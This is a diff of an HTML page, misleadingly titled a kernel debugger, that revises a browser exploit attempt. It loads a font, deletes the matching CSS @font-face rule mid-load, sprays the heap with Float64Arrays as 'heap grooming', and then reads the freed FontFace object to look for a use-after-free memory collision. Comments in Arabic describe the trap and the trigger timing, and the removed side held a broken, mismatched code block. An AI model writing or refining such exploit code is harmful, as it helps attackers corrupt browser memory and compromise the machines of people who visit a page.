@@ -3,65 +3,64 @@
 <head>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-        #console { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; background: #0a0a0a; }
-        .log { margin-bottom: 5px; font-size: 12px; }
+        #console { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; background: #0a0a0a; font-size: 12px; }
+        .log { margin-bottom: 3px; border-bottom: 1px solid #111; }
     </style>
 </head>
 <body>
-    <h3>JANUS_KERNEL_DEBUGGER v1.2 [FORCE_TRIGGER]</h3>
+    <h3>JANUS_KERNEL_DEBUGGER v2.0 [STABLE_TRIGGER]</h3>
     <div id="console"></div>
     <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
 
     <script>
         const log = (msg) => {
             const consoleDiv = document.getElementById('console');
-            consoleDiv.innerHTML += `<div class="log">[LOG] ${msg}</div>`;
+            consoleDiv.innerHTML += `<div class="log">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         };
 
-        window.onload = () => {
-            log("INIT: Setting up memory traps...");
+        window.onload = async () => {
+            log("INIT: Kernel Debugger Active.");
             
-            // متغيرات عالمية لمنع التنظيف
-            window.spray = [];
+            // 1. إعداد الفخ (The Memory Trap)
             let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
-            
-            // استبدل الـ Hook القديم بهذا:
-                    // بدلاً من الـ Hook، استخدم هذا:
-document.fonts.ready.then(() => {
-    log("Fonts ready state triggered!");
-});
-
-                        // تنفيذ التحرير
-                        document.getElementById('s').sheet.deleteRule(0);
-                        log("--- Rule deleted. Starting Heap Spray ---");
-                        
-                        // الضخ المباشر باستخدام Float64Array
-                        for (let i = 0; i < 1000; i++) {
-                            let arr = new Float64Array(32);
-                            arr[0] = 0.123456789; 
-                            window.spray.push(arr);
-                        }
-                        log("--- Spray complete. Checking stability ---");
-                        
-                        setTimeout(() => {
-                            try {
-                                let val = A.family;
-                                log("READ_VALUE: " + val);
-                            } catch(e) {
-                                log("ERROR: " + e.message);
-                            }
-                        }, 500);
-                        
-                        return undefined;
-                    }
-                    return undefined;
-                }
-            });
-
             document.fonts.add(A);
-            log("Triggering font load...");
-            document.fonts.load('1em targetFont', 'AB');
+            
+            log("Monitoring font status...");
+
+            // 2. استخدام التوقيت المعتمد بدلاً من الـ Hook المحجوب
+            // سنراقب متى يبدأ المحرك بمعالجة الخط
+            try {
+                // محاولة التحميل القسري
+                document.fonts.load('1em targetFont', 'AB');
+                
+                // نستخدم setTimeout لضمان أننا في الـ Event Loop الصحيح بعد محاولة التحميل
+                setTimeout(() => {
+                    log("Triggering Rule Deletion...");
+                    document.getElementById('s').sheet.deleteRule(0);
+                    
+                    log("Heap Grooming: Spraying ArrayBuffers...");
+                    window.spray = [];
+                    for (let i = 0; i < 2000; i++) {
+                        let buf = new Float64Array(32);
+                        buf[0] = 0.555;
+                        window.spray.push(buf);
+                    }
+                    
+                    log("Grooming complete. Checking for memory collision...");
+                    
+                    // محاولة القراءة النهائية
+                    try {
+                        let val = A.family;
+                        log("READ_RESULT: " + val);
+                    } catch(err) {
+                        log("READ_STATUS: " + err.message);
+                    }
+                }, 100);
+
+            } catch(e) {
+                log("FATAL_ERROR: " + e.message);
+            }
         };
     </script>
 </body>
